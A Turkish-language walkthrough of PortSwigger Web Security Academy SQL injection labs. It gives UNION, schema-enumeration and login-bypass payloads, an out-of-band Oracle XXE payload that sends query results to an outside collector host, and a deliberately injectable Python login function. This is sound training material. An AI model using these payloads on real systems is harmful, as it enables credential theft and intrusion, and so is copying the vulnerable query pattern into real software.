# Web Security 0x0A | Web Security Academy'den Devam Ediyoruz - SQL Injection Lab Çözümleri | MDISEC Neler Anlattı #9

# Lab: SQL injection UNION attack, retrieving data from other tables

Lab ortamı hakkında genel bilgiler bu kısımda verilmiştir.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled.png)

Lab ortamına eriştiğimizde bizleri bu şekilde bir sayfa karşılamaktadır. Burada ilk baktığımızda UNION base SQL injection tipinde bir açık olabileceğini bilmekteyiz. Çünkü verilerin kesin olarak veritabanından çekilerek sayfada görüntülendiğini görmekteyiz. 

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%201.png)

Bir saldırı 2 adımdan oluşmaktadır. İlk adım zafiyetin tespiti, ikinci adım ise zafiyetin sömürülmesi adımlarıdır. 

burada zafiyetin tespitini yaparken öncelikle category parametresinin sonuna bir ‘ işareti koyuyoruz.

```html
academy.net/filter?category=Clothing'
```

Buradaki mantık gönderdiğimiz değerin sql sorgusunda kullanılırken sorguyu değiştirerek farklı sonuçlar getirmesine dayanmaktadır. Koyduğumuz tırnak işareti diğer tırnak işaretini escape edeceği için zafiyetin varlığını bu şekilde çok hızlı tespit edebilirsiniz.

```html
SELECT * FROM x Where y = 'Clothing'''
```

internal server hatasını çözdüğümüzü görmekteyiz.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%202.png)

bu tespiti pek tabii ki başka bir yoldan da yapabilirsiniz ancak önemli olan mantığını anlamaktır.

```html
' and '1'='1
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%203.png)

yazdığımız değer ile ilk tırnak işaretini escape ettikten sonra kalan tırnak işaretini de geçersiz kılmak için yorum satırı haline getirebilmek için - - işareti koyarız. Ancak bunun gerçekten istediğimiz gibi çalışıp çalışmadığını anlamamız gerekmektedir.

```html
SELECT * FROM x WHERE y = 'accessories' UNION SELECT 1 --'
```

Eğer sorgumuzu bu hale getirirsek command out için ne yapmamız gerektiğini daha rahat anlamış oluruz.

```html
SELECT * FROM x WHERE y = 'accessories' and 1=1--'
```

Gördüğünüz gibi bu ifadeyi yazmak burada bizim için yeterli oldu.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%204.png)

Buradaki kaynakta da faydalı sql ipuçlarını bulabilirsiniz: [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

Şimdi bu kısmı da anladıktan sonra tekrar incelemeye devam edelim.

```html
academy.net/filter?category=Corporat' UNION SELECT null--
```

parametreden sonra bu şekilde bir ifade yazdığımızda tekrar hata almaktayız. kolon sayılarının eşit olmamasından dolayı oluşan bir hatadır bu. 

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%205.png)

UNION ifadesinden sonraki SELECT sorgusunda kolon sayısını ikiye çıkardığımızda hatanın çözüldüğünü görmekteyiz. Dolayısıyla kolon sayısını da bulmuş olduk.

```html
academy.net/filter?category=Corporat' UNION SELECT null,null--
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%206.png)

Bizden önceki SELECT sorgusundan herhangi bir veri gelmemesi için de o kısma alakasız bir değer vererek veri gelmesini önleyebiliriz, bu sayede sadece istediğimiz verilerin gelmesini sağlayarak daha temiz bir sayfa üzerinde çalışabiliriz.

```html
academy.net/filter?category=alakasizbirdeger' UNION SELECT null,null--
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%207.png)

lab ortamında bizden ‘users’ tablosundaki ‘username’ ve ‘password’ alanlarını getirmemiz istenmişti. Dolayısıyla null yerine bu kolonları yazıp sonuçları getirebiliriz.

```html
academy.net/filter?category=alakasizbirdeger' UNION SELECT username,password FROM users--
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%208.png)

Görmüş olduğunuz üzere veritabanındaki kayıtları getirebilmiş olduk. Bu şekilde administrator hesabıyla giriş yaptığımızda lab ortamı çözülmüş olacaktır.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%209.png)

# Lab: SQL injection UNION attack, retrieving multiple values in a single column

Bu lab ortamında da tek bir kolon olduğunda birden fazla veriyi nasıl alabileceğimizle ilgili bir çalışma mevcut. Yani birden fazla kolon olmasına rağmen tek bir kolon ekrana yazılıyorsa bunu nasıl alırız diye düşünmemiz gerekmektedir. 

```html
SELECT a,b,c,d,e FROM x WHERE y = ???
```

Burada uygulamamızın hangi kolonundaki veriyi ekrana yazdırdığını tespit edelim öncelikle. Bir önceki lab ortamında yaptığımız gibi ilerleyebiliriz başlangıçta. Burada ekrana 2. kolonun yazıldığını görebiliriz. Ayrıca burada null kullanmamızın sebebi de postgreSQL veritabanında kolon tiplerinin aynı olması gerektiği içindir. null yerine başka herhangi bir değer girdiğimizde veri tipi uyuşmazlığı çıkabileceği için hata ile karşılaşabiliriz. null değeri mysql için de geçerlidir. 

```html
academy.net/filter?category=yenialakasizbirdeger' UNION SELECT null,'ilker' FROM users--
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2010.png)

Burada ‘ilker’ yazdığımız yerde farklı tabloların çıktılarını birleştirmemiz gerektiği için bu işlemi yapmalıyız. Bu şekilde ilerlediğimizde CONCAT ile birleştirme işlemini yapıp sonuçları getirebiliriz. 

```html
academy.net/filter?category=olmayanbirsonuc' UNION SELECT null,CONCAT(username,':::ilker:::',password) FROM users--
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2011.png)

Sonuç olarak bu bilgiler ışığında administrator olarak giriş yaptığımızda lab çözülmüş olmaktadır :)

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2012.png)

# Lab: SQL injection attack, querying the database type and version on Oracle

Sıradaki SQL Injection lab ortamına erişiyoruz.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2013.png)

Burada da SQL açığının varlığını tespit edebiliriz kolaylıkla.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2014.png)

kolon tiplerinde hata almamak için Oracle veritabanında da null kullanabiliriz.

```html
' UNION SELECT null,null FROM dual--
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2015.png)

Ekrana yazılan kolonun da 2. kolon olduğunu bu şekilde tespit etmekteyiz.

```html
' UNION SELECT null,'ilker' FROM dual--
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2016.png)

Oracle veritabanında versiyon bilgisini öğrenmek için de yukarıda paylaştığımız cheat sheet’te görebileceğiniz üzere bu şekilde bir sorgu yazmamız gerekmektedir.

```html
' UNION SELECT null,banner FROM v$version--
```

Bu sorguyu yaptığımızda da lab’ın çözüldüğünü görebiliriz.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2017.png)

# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Sıradaki lab için de yine versiyon bilgisini öğrenmemiz istenmektedir. 

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2018.png)

Burada yapacağımız şey ise önceki saldırılardan farklı olarak yorum satırı yapmak için ‘--’ ifadesini kullanmak yerine ‘#’ kullanmaktır. Versiyon bilgisini getirmek için de ‘@@version’ ifadesini kullanmalıyız. Ayrıca ‘#’ ifadesinin tarayıcı tarafından location hash olarak algılanmaması için de encode ederek ‘%23’ şeklinde yazmamız gerekmektedir.

```html
mdisec' UNION SELECT null,@@version%23
```

ve lab çözüldü…

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2019.png)

# Lab: SQL injection attack, listing the database contents on non-Oracle databases

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2020.png)

Bu lab ortamında da  ‘username’ ve ‘password’ bilgilerini tutan tabloyu okuyarak administrator kullanıcısı için gerekli bilgileri öğrendikten sonra bu kullanıcı ile giriş yapmamız istenmektedir. Veritabanının da Oracle olmadığını görmekteyiz.

Öncelikle buradaki veritabanının ne olduğunu inceleyelim. Bunu da yaptığımız sorgulamaların yapısı ile testip edebiliriz. Burada null ifadesini kullanınca sonuçların geldiğini gördüğümüz için postgreSQL olduğunu söyleyebiliriz. Çünkü postgreSQL veritabanıdaki kolon tiplerinin aynı olmasını istediği için null ifadesi yerine 1,2 gibi farklı tiplerde değişkenler verdiğimizde hata verecektir. 

```html
mdisec' UNION SELECT null,null -- asdf
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2021.png)

Veritabanındaki tabloları getirmek için de PostgreSQL için bu şekilde bir sorgu yazmamız gerekiyor. Tekrar hatırlatmış olalım, sonundaki “-- asdf” ifadesini veritabanı sorgusundaki kalan kısmı command out yapmak için yani yorum satırı yaparak geçersiz kılmak için ekledik. “table_name” değerini de veritabanı 2. kolonu ekrana yazdırdığı için ikinci kolona verdik. 

```html
mdisec' UNION SELECT null,table_name FROM information_schema.tables -- asdf
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2022.png)

Burada birçok tablo ismi gelmekte olduğu için bizim için gereksiz olan tabloların gelmemesini sağlamalıyız. Bunun için SQL sorgumuzda bir WHERE ibaresi koyarak gerekli tabloları getirebiliriz. Bunun nasıl yapıldığını bilmiyorsak da internette basit bir araştırma ile bulabiliriz.

```html
mdisec' UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema=current_schema() -- asdf
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2023.png)

Bu kısımdan sonra da “users_nmvfut” için tablo kolon isimlerini öğrenmemiz gerekiyor. 

```html
mdisec' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users_nmvfut' -- addf
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2024.png)

```html
gelen sonuçları not ediyoruz:
Tablo Adı: 
users_nmvfut

Kolon Adları:
password_ugssmd
email
username_obdlzx
```

Bu bilgiler ışığında yeni SQL sorgumuzu hazırlayalım. 

```html
mdisec' UNION SELECT null, concat(username_obdlzx,':::ilker:::',password_ugssmd) FROM users_nmvfut -- adfsf
```

Bu şekilde sorgumuzu SQL Injection güvenlik açığı sayesinde web uygulamasında çalıştırdığımızda istediğimiz sonuçları artık alabiliyoruz.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2025.png)

Ve son olarak administrator hesabıyla giriş yaptığımızda lab çözülmüş oluyor…

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2026.png)

# Lab: SQL injection attack, listing the database contents on Oracle

Bu lab ortamında da Oracle veritabanında benzer şeyleri yapmamız istenmektedir.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2027.png)

Burada da başlangıçta parametre kısmına bu ifadeyi vererek başlayabiliriz.

```python
mdisec' UNION SELECT null,null FROM dual --
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2028.png)

Daha sonra tablo isimlerini getiriyoruz. Buradaki tablo isimlerini kontrol ettiğimizde kullanıcılarla ilgili olan tablonun “**USERS_XEDOYY**” olduğunu görmekteyiz.

```python
mdisec' UNION SELECT table_name,null FROM all_tables --
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2029.png)

Şimdi de bu tablodan veri çekmeliyiz. Bunun için de bu şekilde ilerleyebiliriz. Burada da kolon isimlerini elde etmekteyiz.

```python
mdisec' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_XEDOYY'--
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2030.png)

```python
Tablo adı ve Kolon isimlerimizi not alıyoruz:
tablo: 
**USERS_XEDOYY
kolonlar:**
EMAIL
PASSWORD_VDQFLZ
USERNAME_ZIOPHP
```

Bu aşamadan sonra da bu kolonlardaki verileri çekmeye yönelik bir SQL sorgusu yazmamız gerekmektedir. Burada iki kolon da ekrana yazıldığı için concatenation yani birleştirme yapmamıza gerek yok.

```python
mdisec' UNION SELECT USERNAME_ZIOPHP,PASSWORD_VDQFLZ FROM USERS_XEDOYY --
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2031.png)

Buradan artık administrator hesabıyla giriş yaptığımızda lab çözülmüş oluyor.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2032.png)

# Lab: Blind SQL injection with conditional responses

Sıradaki lab ortamında ise bizden istenen yine administrayor hesabının parolasını öğrenerek giriş yapmamızdır. 

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2033.png)

Bu lab ortamında Blind SQL injection olduğu için sqlmap gibi hazır araçlar kullanarak deneme yanılma yöntemiyle sonuçlar çıkarılmalıdır. Bu lab çözümü için ayrı bir yazıda ya bu araçları kullanarak ya da kendi python kodumu yazarak bir çözüm sunacağım. 

# Lab: Blind SQL injection with out-of-band data exfiltration

Sıradaki lab ortamı için araştırmalara başlayalım.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2034.png)

Lab’a eriştiken sonra herhangi bir ürün detayına tıklayıp oluşan request’leri burpsuite aracıyla incelediğimizde productID ile bağlantılı olan request dikkatimizi çekmektedir.

```python
GET /product?productId=2 HTTP/2
```

Burada request’i incelediğimizde SQL Injection’ın oluşacağı nokta Cookie’deki TrackingId kısmı olabilir. Yani insert sorgusu işlemindedir. O yüzden de burada Time Based SQL Injection payload’larıını denemeliyiz. Request-Response arasındaki zaman farklarını ölçmeliyiz.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2035.png)

Time Based SQL Injection payload’larını denediğimizde istediğimiz gibi bir sonuç alamamaktayız. Beklentimiz burada bir delay oluşmasıydı ancak herhangi bir gecikme ya da bekleme oluşmadı.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2036.png)

Burada aynı zamanda asenkron yapıda SQL Injection da olabilir. Örneğin buradaki amacımız kullanıcının web uygulamasına request gönderip response alması ve bizim de bu alışveriş esnasındaki zaman farkını alarak SQL Injection’ın varlığını tespit etmektir. 

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2037.png)

Ancak buradaki sistemde sizden alınan request’e direkt olarak response dönülüyor olabilir. Bu esnada arka planda bir adet background job başlatılıyor olabilir. Bu background job da sizden aldığı parametre ile bir iş yapıyor olabilir. Örnek verecek olursak buradaki web uygulamasının sizden aldığı parametreyi bir Queue’ya yazdığını düşünelim. Aynı ortamda bir adet de Worker olduğunu düşünürsek buradaki Worker Queue’dan verileri alıp Insert işlemini yapıyor olabilir. Çok fazla işlem olduğu için bunların hepsini request-response döngüsünde yapmak zordur, bu yüzden işlemleri background job’lar ile halletmek gerekebilir bazı durumlarda. Böyle yapılarda sizin kullandığınız Time Based SQL Injection Payload’ları bir işe yaramamaktadır. Buradaki lab ortamının açıklamasında da böyle bir yapı olduğundan bahsedilmiştir. Örneğin SQL Injection aslında çalışıyor ancak background job bekliyor olabilir. Bu tür durumlarda zaten SQL Injection varsa da tek çözüm noktası bu uygulamanın dışarıdaki bir sistemle iletişim kurmasını sağlamaktır. 

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2038.png)

Şuan SQL Injection zafiyetinin varlığını ve veritabanı sisteminin ne olduğunu tespit edemediğimiz için başlangıçta Oracle üzerinden denemeler yapalım. Bu kısımdaki yapıdan yararlanacağız. Buradaki yapıda da daha önce ele aldığımız XXE zafiyeti ile alakalı bir konudur. 

```python
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

Buraya gelirken de anlamamız gereken bir nokta daha bulunmakta. Cookie’de bulunan TrackingId alındıktan sonra ne yapıldığını da bilmeliyiz.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2035.png)

Gerçek hayattan örnekleri düşünecek olursak TrackingId’nin değeri direkt olarak SELECT sorgularında geçmez, INSERT sorgularında geçmesi daha muhtemeldir. 

```python
INSERT INTO X (a,b,c) VALUES ('','','yVal16XJw78Gd1zM')
```

Bizim değerimiz buraya geliyorsa Oracle’da string birleştirmenin nasıl olduğuna bakarak ilerleyebiliriz. Oracle’da string birleştirme 'foo'||'bar’ şeklinde olmaktadır. Örneğin bizim verimiz 3. değişkende olacaksa burada bir subselect sorgusu açabilir miyiz diye düşünelim. Eğer bunu gerçekleştirebilirsek buradan ilerleyebiliriz. 

```python
INSERT INTO X (a,b,c) VALUES ('','','yVal16X||()||Jw78Gd1zM')
```

Lab ortamında da yapmamız gereken şey temelde bu mantığa dayanmaktadır. Ayrıca buradaki bazı özel karakterleri de Cookie yapısının bozulmaması için encode etmemiz gerekmektedir. Noktalı virgül → %3b ve % → %25

```python
'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http://https://eo2pbauj182lj8v.m.pipedream.net/"> %25remote%3b]>'),'/l') FROM dual)||'
```

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2039.png)

Request’in başarıyla geldiğini görebiliriz.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2040.png)

Bu aşamadan sonra da web uygulamasının veritabanındaki username ve password bilgilerini çıkarmamız gerkmektedir. Bunun için de şu şekilde bir sorgulama yapabiliriz;

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2041.png)

Burada artık password değerini dışarıya çıkarabileceğimiz bir yapı ile devam edelim. 

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2042.png)

 Bu da parolayı başarıyla bulabildiğimizin kanıtı…

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2043.png)

Ve administrator hesabına giriş yapınca lab artık çözüldü. 

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2044.png)

# **Lab: SQL injection vulnerability allowing login bypass**

Sıradaki lab ortamında da giriş işlemi yapılırken SQL Injection’dan yararlanıp giriş yapmamız istenmektedir.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2045.png)

Burada da çok kolay bir şekilde aşağıdaki gibi çözebiliriz.

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2046.png)

Buradaki programın giriş kontrolü için genel olarak şöyle bir yapı kurduğunu ve buna göre hareket ettiğini düşünebiliriz. Buradaki yapıya göre gelen username ve password değerleri SQL sorgusuna yerleştirilerek doğrudan kontrol edilmektedir. Ancak biz username alanına “administrator’—” ifadesini girdiğimizde kalan kısmın hiçbir önemi kalmaz ve ismi “administrator” olan kişinin parolası doğru olmasa bile girişi gerçekleştirilmiş olur.

```python
import sqlite3

def login(username, password):
    # SQLite veritabanına bağlan
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()

    # Kullanıcı adı ve şifreyi kullanarak SQL sorgusunu oluştur
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

    # SQL sorgusunu çalıştır
    cursor.execute(query)

    # Sonuçları al
    result = cursor.fetchone()

    # Bağlantıyı kapat
    conn.close()

    # Sonucu kontrol et ve giriş yap
    if result:
        print("Giriş Başarılı")
    else:
        print("Giriş Başarısız")

# Kullanıcıdan giriş bilgilerini al
username = input("Kullanıcı Adı: ")

# Güvenlik açığını kullanarak giriş yap
login("administrator'--", "herhangibirşifre")
```

Dolayısıyla girdiğimiz ifade ile SQL sorgumuz şu şekilde olacağı için kalan kısmın herhangi bir önemli kalmaz ve parola yanlış olsa bile giriş işlemi yapılır. Burada verdiğimiz ilk ‘ işareti önceki kısmı kapatmış olur, kalan — işareti ise diğer kısmı command out eder yani yorum satırı olarak düşünebilirsiniz.

```python
SELECT * FROM users WHERE username='administrator'--' AND password='herhangibirşifre'
```

Lab çözüldü…

![Untitled](Web%20Security%200x0A%20Web%20Security%20Academy'den%20Devam%20E%205d98a1205cb7439db45c8e0570ab118e/Untitled%2047.png)

## KAYNAKLAR:

1.  [https://www.youtube.com/watch?v=ebLgQiG7ACw](https://www.youtube.com/watch?v=ebLgQiG7ACw)
2. [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
3. [https://medium.com/@frank.leitner/write-up-sql-injection-attack-listing-the-database-contents-on-oracle-portswigger-academy-73b932b67d9e](https://medium.com/@frank.leitner/write-up-sql-injection-attack-listing-the-database-contents-on-oracle-portswigger-academy-73b932b67d9e)